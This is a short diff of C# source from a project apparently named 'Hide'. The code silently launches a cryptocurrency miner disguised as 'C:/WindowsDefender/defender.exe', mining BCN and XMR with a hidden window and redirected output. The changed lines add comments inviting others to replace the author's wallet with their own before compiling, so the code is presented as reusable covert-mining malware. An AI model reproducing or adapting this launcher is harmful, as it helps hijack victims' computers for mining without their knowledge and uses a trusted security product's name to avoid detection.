@@ -8,8 +8,8 @@ namespace Hide
         {
             System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
             startInfo.FileName = "C:/WindowsDefender/defender.exe";
-            startInfo.Arguments = "-user dylan@thisiswhereidostuff.com -bcn 2 -xmr 2";
-            startInfo.RedirectStandardOutput = true;
+            startInfo.Arguments = "-user dylan@thisiswhereidostuff.com -bcn 2 -xmr 2"; //this is obviously my wallet, replace with your own
+            startInfo.RedirectStandardOutput = true;                                   //before compiling
             startInfo.RedirectStandardError = true;
             startInfo.UseShellExecute = false;
             startInfo.CreateNoWindow = true;
